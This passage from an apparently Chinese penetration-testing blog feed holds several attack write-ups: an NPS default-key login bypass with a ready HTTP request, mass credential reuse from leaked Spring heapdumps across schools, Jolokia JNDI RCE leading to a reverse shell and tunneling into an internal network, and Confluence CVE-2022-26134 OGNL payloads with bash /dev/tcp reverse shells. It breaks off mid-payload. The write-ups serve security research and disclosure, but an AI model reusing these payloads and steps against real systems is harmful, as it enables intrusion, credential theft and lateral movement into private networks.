alt="image-20230601153735016"></p><p>有POC有针对于这个默认的授权密钥的，判断返回包里内容是否存在5acabcf051cd55abca03d18294422e01</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601154137975.png" alt="image-20230601154137975"></p><p>当时觉得单判断默认的crypt_auth_key是不严谨的，因为绕过登陆验证归根究底的原因是auth_key默认被注释掉了，所以说条件语句中只要携带了auth_key与timestamp两个参数并且满足条件就可以绕过登录认证。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601154415168.png" alt="image-20230601154415168"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;crypt_auth_key&quot;</span>: <span class="string">&quot;5acabcf051cd55abca03d18294422e01&quot;</span></span><br><span class="line">#auth_key=test</span><br><span class="line">auth_crypt_key =<span class="number">1234567812345678</span></span><br><span class="line">crypt_auth_key密文是由明文test经过AES的CBC模式进行加密得到的，加密密钥是<span class="number">1234567812345678</span></span><br></pre></td></tr></table></figure><p>（1）那么如果auth_key没有被注释，继续看看会怎么样</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601163250488.png" alt="image-20230601163250488"></p><p>crypt_auth_key已经不再是默认的5acabcf051cd55abca03d18294422e01，注释去掉之后的密文变成了04acf026285da15817ac9a072c1259ac，不存在绕过登陆验证，携带着POC访问后台，页面跳转到登录页</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601164550182.png" alt="image-20230601164550182"></p><p>（2） 如果auth_key被注释了，修改加密密钥auth_crypt_key，看看会怎么样：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601165213418.png" alt="image-20230601165213418"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601165200175.png" alt="image-20230601165200175"></p><p>密文同样改变，因为加密密钥改变，密文肯定变，尝试绕过登陆验证</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601165318584.png" alt="image-20230601165318584"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601165436097.png" alt="image-20230601165436097"></p><p>成功绕过登陆验证，获取客户端列表🐓队。</p><p>综上所述：单说NPS啊，不提加密向量不一样什么的导致的加密结果不一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加密密钥如果没被修改，auth_key=test有注释，那么密文一定是：5acabcf051cd55abca03d18294422e01 ---登陆绕过存在</span><br><span class="line">加密密钥如果没被修改，auth_key=test取消注释，那么密文一定是：04acf026285da15817ac9a072c1259ac ---登陆绕过不存在</span><br><span class="line">如果密钥被修改，auth_key=test有注释，那么密文一定不是上述这两个 ---登陆绕过存在</span><br><span class="line">如果密钥被修改，auth_key=test取消注释，那么登陆绕过肯定不存在</span><br></pre></td></tr></table></figure><p>所以说，POC还是有道理的，因为如果加密密钥是默认的1234567812345678，auth_key&#x3D;test有注释，那么密文一定是5acabcf051cd55abca03d18294422e01，那么登陆绕过就一定存在</p><p>正反推</p><p>修复建议：去掉#auth_key&#x3D;test的注释即可，想下载源代码重新编译的也可以，密钥也可以看个人情况修改什么的。</p><p>来一组互联网案例，用afrog编写POC（探测密文是5acabcf051cd55abca03d18294422e01），也就是说加密密钥未修改，auth_key&#x3D;test有注释，一定存在登陆绕过的互联网案例</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601234920898.png" alt="image-20230601234920898"></p><p>在来一组成功绕过登陆进入后台的互联网案例，挺多的：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601235115359.png" alt="image-20230601235115359"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230601235233987.png" alt="image-20230601235233987"></p><p>第二种反制手段就是注册，在nps.conf中，默认关闭注册功能以及注册用户登陆功能</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602000848167.png" alt="image-20230602000848167"></p><p>假如开启注册的话：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602001023922.png" alt="image-20230602001023922"></p><p>首页就会出现注册按钮（默认情况下是没有的）：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602001359311.png" alt="image-20230602001359311"></p><p>尝试注册登陆：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602001043127.png" alt="image-20230602001043127"></p><p>成功进入后台：需将allow_user_login&#x3D;true，意为允许注册用户进行登陆，否则登录是不成功的</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602001120767.png" alt="image-20230602001120767"></p><p>虽然登陆成功，但是权限会少很多，起码可以修改（较登陆绕过鸡肋一点）：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602001159794.png" alt="image-20230602001159794"></p><p>以上就是个人的分析思路，如有不足，请见谅。</p><p>最后，你懂的（仅仅只做验证，并未进行敏感操作！！！）：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230602010608176.png" alt="image-20230602010608176"></p><p>别找了，你想要的在下边：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index/gettunnel?auth_key=5d712b45490f8ac1f630f9cce0a5e173&amp;timestamp=1685638945</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">offset</span><span class="operator">=</span><span class="number">0</span><span class="variable">&amp;limit</span>=<span class="number">10</span><span class="variable">&amp;type</span>=<span class="variable">&amp;client_id</span>=<span class="number">3</span><span class="variable">&amp;search</span>=</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 红队技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次曲折的EDU漏洞挖掘</title>
      <link href="/posts/1f2f88c3/"/>
      <url>/posts/1f2f88c3/</url>
      
        <content type="html"><![CDATA[<h2 id="1-挖掘思路"><a href="#1-挖掘思路" class="headerlink" title="1.挖掘思路"></a>1.挖掘思路</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xx1-server/下actuator端点泄露--heapdump转储文件获取用户名密码-js中发现xx2和xx3路径中actuator端点泄露-尝试RCE(失败)-swagger-ui信息泄露-编写poc（批量）</span><br></pre></td></tr></table></figure><h2 id="2-x2F-xx1-server-x2F-下actuator端点泄露"><a href="#2-x2F-xx1-server-x2F-下actuator端点泄露" class="headerlink" title="2.&#x2F;xx1-server&#x2F;下actuator端点泄露"></a>2.&#x2F;xx1-server&#x2F;下actuator端点泄露</h2><p>对某edu进行了一波信息收集，发现某系统下调用了&#x2F;xx1-server&#x2F;的服务</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528104948244.png" alt="image-20230528104948244"></p><p>尝试访问此路径，发现springboot信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528105632715.png" alt="image-20230528105632715"></p><p>尝试访问actuator，发现包括heapdump以及jolokia诸多端点泄露</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528085052307.png" alt="image-20230528085052307"></p><p>先下载heapdump文件查看</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528090656170.png" alt="image-20230528090656170"></p><p>第一个heapdump利用工具无结果：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528085148762.png" alt="image-20230528085148762"></p><p>第二个heapdump利用工具通过搜索关键字username和password找到用户名密码：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528085222178.png" alt="image-20230528085222178"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528085314713.png" alt="image-20230528085314713"></p><p>还有内网数据库链接信息以及一个类似学号的用户名：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528085641051.png" alt="image-20230528085641051"></p><p>heapdump泄露的用户名密码较复杂，此系统还有一个平台可以登陆，尝试登陆提示失败</p><h2 id="3-js中发现xx2和xx3下actuator端点泄露"><a href="#3-js中发现xx2和xx3下actuator端点泄露" class="headerlink" title="3.js中发现xx2和xx3下actuator端点泄露"></a>3.js中发现xx2和xx3下actuator端点泄露</h2><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528084837797.png" alt="image-20230528084837797"></p><p>&#x2F;xx2-server&#x2F;无法访问，但是&#x2F;xx3-server&#x2F;可以访问，提示401</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528090240008.png" alt="image-20230528090240008"></p><p>尝试使用&#x2F;xx1-server&#x2F;中heapdump泄露的用户名密码进行登陆，登陆成功，同样存在heapdump</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528090442258.png" alt="image-20230528090442258"></p><p>尝试下载打开，发现没有什么有价值的东西</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528090627520.png" alt="image-20230528090627520"></p><h2 id="4-尝试RCE-失败，原因太菜"><a href="#4-尝试RCE-失败，原因太菜" class="headerlink" title="4.尝试RCE(失败，原因太菜)"></a>4.尝试RCE(失败，原因太菜)</h2><p>actuator下还存在jolokia以及jolokia&#x2F;list，尝试jolokia Realm JNDI RCE</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528091312533.png" alt="image-20230528091312533"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528091350595.png" alt="image-20230528091350595"></p><p>RCE以失败告终，接收到了目标请求，但是没有反应，高版本的JDK也试（env获取到的目标是jdk1.8），均失败，(github中的py脚本是get型的，在这里是登陆认证之后的，需要简单修改一下脚本，携带着header中的Authorization进行POST请求发包)。至于为什么不成功，可能””态势感知””或者”waf”知道</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528091551053.png" alt="image-20230528091551053"></p><h2 id="5-事件型到”通用型”"><a href="#5-事件型到”通用型”" class="headerlink" title="5.事件型到”通用型”"></a>5.事件型到”通用型”</h2><p>继续查看xxx.js文件，发现一行被注释的URL，指向的是另外一个学校的&#x2F;xx3-server&#x2F;，尝试利用title关键字进行搜索：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528094345584.png" alt="image-20230528094345584"></p><p>结果不是很多，尝试用js文件搜索，这次结果还可以</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528094823835.png" alt="image-20230528094823835"></p><p>发现均存在xxx.js文件，并且xxx.js文件中基本都发现路径xx1-server、xx2-server以及xx3-server，有的可能只有xx1和xx2路径，尝试访问xx1，不需要密码，xx2同样无法访问，访问到xx3-server的时候，同样出现401，第一个学校中xx1-server下heapdump中获取到的用户名密码登陆到了第一个学校的&#x2F;xx3-server&#x2F;，再加上貌似是个通用型的服务，假如是通用型用户名密码，尝试用户名密码登陆第二个学校的&#x2F;xx3-server&#x2F;，登陆成功，验证了第一个猜想。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528113929392.png" alt="image-20230528113929392"></p><p>spring常见的还有swagger-ui以及v2&#x2F;api-docs，尝试访问，均存在（后面会尝试通过接口获取敏感信息）：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528114140697.png" alt="image-20230528114140697"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528114223086.png" alt="image-20230528114223086"></p><p>尝试访问其它学校，看看是不是同样的可以用户名密码登陆</p><p>是这样的，第三个学校同样xx1-server直接访问，但是actuator下无特殊端点泄露，xx2-server无法访问，xx3-server提示401登陆验证，使用泄露的用户名密码尝试登陆，登陆成功，存在swagger-ui以及v2&#x2F;api-docs</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528114624710.png" alt="image-20230528114624710"></p><p>尝试访问第四个学校，xxx.js同样存在，但是多了一个&#x2F;xx4-server&#x2F;路径，同样xx1-server直接访问，但是actuator下无特殊端点泄露，xx2-server无法访问，xx3-server提示401登陆验证，使用泄露的用户名密码尝试登陆，登陆成功，存在swagger-ui以及v2&#x2F;api-docs，尝试访问&#x2F;xx4-server&#x2F;，actuator下无特殊端点泄露。</p><p>第五个学校同样如此</p><h2 id="6-swagger-ui信息泄露"><a href="#6-swagger-ui信息泄露" class="headerlink" title="6.swagger-ui信息泄露"></a>6.swagger-ui信息泄露</h2><p>在swagger-ui列出的接口信息中，发现用户管理接口</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528092702211.png" alt="image-20230528092702211"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528092813123.png" alt="image-20230528092813123"></p><p>貌似没用到token什么的进行鉴权，尝试访问可获取到用户敏感信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528092904122.png" alt="image-20230528092904122"></p><p>用同样的方法访问其余站点，试了几个之后均存在敏感信息泄露</p><p>编写afrog <a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a> 的通用POC，批量刷一下：</p><p>首先服务地址是在xxx.js文件中泄露的，先判断是否存在xxx.js，若不存在就跳过，其次是假如开启登陆认证的话，请求头会要求Authorization，内容是第一次heapdump泄露的username:password进行base64编码后的结果</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528103059005.png" alt="image-20230528103059005"></p><p>结果如下：（并未进行敏感操作）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528103756938.png" alt="image-20230528103756938"></p><p>然后可以判断一下actuator端点存在多少，有61个结果，去重之后除去非edu的大概也有几十个吧，包括swagger-ui可以访问的也有不少：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528134214254.png" alt="image-20230528134214254"></p><p>打包提交：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528140456573.png" alt="image-20230528140456573"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230528140718462.png" alt="image-20230528140718462"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次RCE+heapdump信息泄露引发的血案</title>
      <link href="/posts/37ae6fbb/"/>
      <url>/posts/37ae6fbb/</url>
      
        <content type="html"><![CDATA[<blockquote><p>漏洞截止目前已完全修复。</p></blockquote><h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heapdump信息泄露-弱口令-RCE-数据库-后台弱口令-内网系统弱口令-敏感信息挖掘</span><br></pre></td></tr></table></figure><h2 id="2-Heapdump信息泄露"><a href="#2-Heapdump信息泄露" class="headerlink" title="2.Heapdump信息泄露"></a>2.Heapdump信息泄露</h2><p>Springboot搭建的系统，首先访问Actuator模块，看有哪些端点暴露，最常见的就是env、info、metrics等等，最喜人乐见的就是heapdump、gateway、jolokia等，前者可能导致轻微信息泄露、而后者可能导致敏感信息泄露乃至RCE进内网。</p><p>这里需要注意的是，访问Springboot的系统，有时候URL后边直接加actuator提示404并不代表端点没有暴露，可能是文件目录导致的，就比如这次渗透的目标站点就是如此：<a href="https://target.com:8090/xxx/actuator/">https://target.com:8090/xxx/actuator/</a></p><p>访问actuator，查看暴露的端点，发现heapdump文件，直接下载下来打开即可。这里打开heapdump转储文件，打开heapdump的方式有多种，MAT、JDumpSpider-1.0-SNAPSHOT-full.jar、heapdump_tool.jar等等，GitHub也有其它的打开工具，往往一种工具查出来的信息不完整，比如直接用JDumpSpider-1.0-SNAPSHOT-full.jar跑出来的结果可能不全，但是跑出的结果很清晰、heapdump_tool.jar跑出来的结果更全一些，但是结果展示不是很清晰。建议都跑一遍，确保收集信息的广度，这个后边会继续提到</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329211622655.png" alt="image-20230329211622655"></p><p>使用JDumpSpider只跑出来了本地数据库账号口令（为后边拿下内网数据库做了铺垫）</p><p>继续用heapdump_tool.jar在跑一下</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329213702034.png" alt="image-20230329213702034"></p><p>等数据加载完之后，输入关键字进行关键字查询：password、geturl、getfile等，直接输入password搜索password字样</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329213853806.png" alt="image-20230329213853806"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329213936250.png" alt="image-20230329213936250"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329214026991.png" alt="image-20230329214026991"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329214141373.png" alt="image-20230329214141373"></p><p>将收集到的密码做成字典，后期可以做爆破口令用，成功登陆外网druid</p><h2 id="3-jolokia命令执行（jolokia-Realm-JNDI-RCE）"><a href="#3-jolokia命令执行（jolokia-Realm-JNDI-RCE）" class="headerlink" title="3.jolokia命令执行（jolokia Realm JNDI RCE）"></a>3.jolokia命令执行（jolokia Realm JNDI RCE）</h2><p>目标不止有heapdump、还有jolokia端点，jolokia存在RCE漏洞，但是有利用条件（目标JDK版本、是否存在端点以及引用了jolokia-core依赖等）：直接访问&#x2F;jolokia&#x2F;list查看有无type&#x3D;MBeanFactory 和 createJNDIRealm参数可判断是否可能RCE，jolokia&#x2F;list下存在这两个参数，尝试进行jndi注入（GitHub有诸多jndi工具以及利用详情）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230329215501444.png" alt="image-20230329215501444"></p><p>目标有接收请求，貌似也请求了VPS上的class文件，但是反弹shell没反应。大概率是目标主机jdk版本过高导致反弹shell失败，尝试进行高版本jdk进行jndi注入。</p><p>提取准备好base64编码之后的反弹shell语句</p><p>启动jndi工具</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326230140643.png" alt="image-20230326230140643"></p><p>这里使用py工具发送payload：</p><p><a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py</a></p><p>py文件url以及payload修改成jndi工具生成的恶意payload，运行py</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326230121901.png" alt="image-20230326230121901"></p><p>反弹shell成功，反弹回来的shell很多命令没法用，目标主机存在python环境，使用ptyshell实现简单的tty</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326230259448.png" alt="image-20230326230259448"></p><p>目标主机ubuntu，sudo su切换到root用户</p><h2 id="4-登陆数据库"><a href="#4-登陆数据库" class="headerlink" title="4.登陆数据库"></a>4.登陆数据库</h2><blockquote><p>heapdump泄露的数据库账号密码尝试登陆数据库</p></blockquote><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326233016834.png" alt="image-20230326233016834"></p><p>查找用户名口令：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326233249770.png" alt="image-20230326233249770"></p><p>MD5加密的管理员密码，尝试解密：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/1.png" alt="1"></p><p>由于heapdump在管理系统目录下：xxx&#x2F;actuator&#x2F;heapdump，猜测密码大概率是后台管理系统密码</p><p>口令登陆成功：涉及信息过于敏感，暂时不放图了</p><h2 id="5-NPC落地进内网"><a href="#5-NPC落地进内网" class="headerlink" title="5.NPC落地进内网"></a>5.NPC落地进内网</h2><p>VPS开启python服务，目标主机cd到tmp目录下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://xxx:8888/kscan</span><br></pre></td></tr></table></figure><p>将kscan与npc端下载到目标主机tmp目录下</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230330000916557.png" alt="image-20230330000916557"></p><p>运行NPC端：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326230445077.png" alt="image-20230326230445077"></p><p>主机成功上线：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326230516567.png" alt="image-20230326230516567"></p><p>proxifier设置socks5代理尝试连接：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230326230553032.png" alt="image-20230326230553032"></p><p>proxifier添加firefox规则后，根据kscan扫描出的结果尝试访问web服务：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230330001436993.png" alt="image-20230330001436993"></p><p>弱口令*1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230330001622770.png" alt="image-20230330001622770"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230330001654028.png" alt="image-20230330001654028"></p><p>尝试使用数据库中存储的密码挨个进行登陆~</p><h2 id="6-敏感信息泄露"><a href="#6-敏感信息泄露" class="headerlink" title="6.敏感信息泄露"></a>6.敏感信息泄露</h2><p>查找系统中propertie配置文件，获取多个appkey和secret信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230330002035412.png" alt="image-20230330002035412"></p><p>较为敏感的信息就不在放出了</p><p>主要高版本jdk的jndi注入以及信息收集（收集密码做字典定向爆破）的结果，才使得进入内网之后可以拿下多个后台管理系统，从而获取大量敏感信息。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次RCE-内网之旅</title>
      <link href="/posts/cf29e875/"/>
      <url>/posts/cf29e875/</url>
      
        <content type="html"><![CDATA[<p>起因：Nuclei爆红，Atlassian Confluence的命令执行漏洞，编号：CVE-2022-26134<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310091803512.png" alt="image-20230310091803512"></p><h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令执行-反弹shell失败-反弹shell成功-代理nps落地-内网之旅</span><br></pre></td></tr></table></figure><h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>Nuclei已经给出了攻击载荷，而且把RCE之后的结果输出了</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310095706611.png" alt="image-20230310095706611"></p><p>payload解码看一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#a=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;utf-8&quot;)</span>).(<span class="meta">@com</span>.opensymphony.webwork.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&quot;X-Cmd-Response&quot;</span>,#a))&#125;</span><br></pre></td></tr></table></figure><p>payload里，java.lang.Runtime类调用exec方法，执行whoami命令，在自定义的X-Cmd-Response响应头中输出命令执行的结果：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310101132000.png" alt="image-20230310101132000"></p><p>自定义响应头，尝试执行其它命令：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310101408165.png" alt="image-20230310101408165"></p><h2 id="3-反弹shell（失败）"><a href="#3-反弹shell（失败）" class="headerlink" title="3.反弹shell（失败）"></a>3.反弹shell（失败）</h2><p>网上有不少反弹shell的攻击载荷</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/$&#123;<span class="keyword">new</span> <span class="title class_">javax</span>.script.ScriptEngineManager().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;new java.lang.ProcessBuilder().command(&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;).start()&quot;</span>)&#125;/</span><br></pre></td></tr></table></figure><p>用网上公开的攻击载荷尝试反弹shell，发现nc监听一直没反应……</p><p>尝试寻找Confluence的其它版本反弹shell</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310135302296.png" alt="image-20230310135302296"></p><p>成功反弹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230310135426202.png" alt="image-20230310135426202"></p><p>怀疑是版本的问题导致无法反弹shell，可老表告诉我说是特殊字符的问题，于是找了一下java下命令执行的一些细节</p><p>java执行系统命令的代码：</p><ol><li><p>Runtime.getRuntime().exec()</p></li><li><p>new ProcessBuilder().start()</p></li></ol><p>第二种执行系统命令的实现代码已经尝试过了，换第一种Runtime反弹shell，也就是Nuclei已经给出的攻击载荷</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#a=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;).getInputStream(),&quot;utf-8&quot;)</span>).(<span class="meta">@com</span>.opensymphony.webwork.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span class="string">&quot;X-Cmd-Response&quot;</span>,#a))&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是，在使用Runtime执行命令的时候，会限制传入的参数，只能传入一个List对象或者数组，否则会导致命令执行不成功，反弹shell自然也会失败。</p><h2 id="4-反弹shell（成功）"><a href="#4-反弹shell（成功）" class="headerlink" title="4.反弹shell（成功）"></a>4.反弹shell（成功）</h2><p>此时可以bypass让命令成功执行</p><h3 id="1-bypass"><a href="#1-bypass" class="headerlink" title="1.$@bypass"></a>1.$@bypass</h3><p>$@能够获取对应的变量，比如：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c  <span class="string">&#x27;$@|bash&#x27;</span> xx <span class="built_in">echo</span> <span class="built_in">id</span></span><br></pre></td></tr></table></figure></p><p>  这种方法可以成功执行id命令，$@获取 echo id然后通过管道符执行命令id，使用这种方式尝试反弹目标shell</p><p>攻击载荷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c $@|bash 0 echo 命令</span><br></pre></td></tr></table></figure><p>于是$@bypass反弹shell的攻击载荷如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#a=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/6666 0&gt;&amp;1&#x27;).getInputStream(),&quot;utf-8&quot;)</span>).(<span class="meta">@com</span>.opensymphony.webwork.ServletActionContext<span class="meta">@getResponse()</span>.setHeader(<span 